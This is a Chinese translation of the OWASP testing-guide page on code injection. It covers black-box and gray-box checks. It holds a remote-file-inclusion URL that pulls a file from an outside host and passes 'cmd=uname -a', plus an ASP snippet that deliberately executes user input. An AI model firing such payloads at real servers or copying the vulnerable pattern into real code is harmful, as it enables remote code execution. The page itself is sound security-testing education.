# 代码注入测试

## 概述

本节描述测试人员如何检查是否可以在网页中输入代码并让Web服务器执行。

在[代码注入](https://owasp.org/www-community/attacks/Code_Injection)测试中，测试人员提交的输入会被Web服务器作为动态代码或包含文件进行处理。这些测试可针对多种服务器端脚本引擎（如ASP或PHP）进行。需要采用适当的输入验证和安全编码实践来防范此类攻击。

## 测试目标

- 识别可向应用程序注入代码的注入点
- 评估注入漏洞的严重性

## 测试方法

### 黑盒测试

#### PHP注入漏洞测试

通过查询字符串，测试人员可注入代码（本例为恶意URL）使其作为被包含文件的一部分被处理：

`https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`

> 恶意URL被作为PHP页面的参数接受，该参数后续将在包含文件中使用其值。

### 灰盒测试

#### ASP代码注入漏洞测试

检查ASP代码中用于执行函数的用户输入。用户能否在数据输入字段中输入命令？以下ASP代码将把输入保存到文件并执行：

```asp
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt is executed
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>)))
```

### References

- [WSTG-INPV-11](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection.md)
- [Insecure.org](https://insecure.org/)
- [Wikipedia](https://www.wikipedia.org)
- [Reviewing Code for OS Injection](https://wiki.owasp.org/index.php/OS_Injection)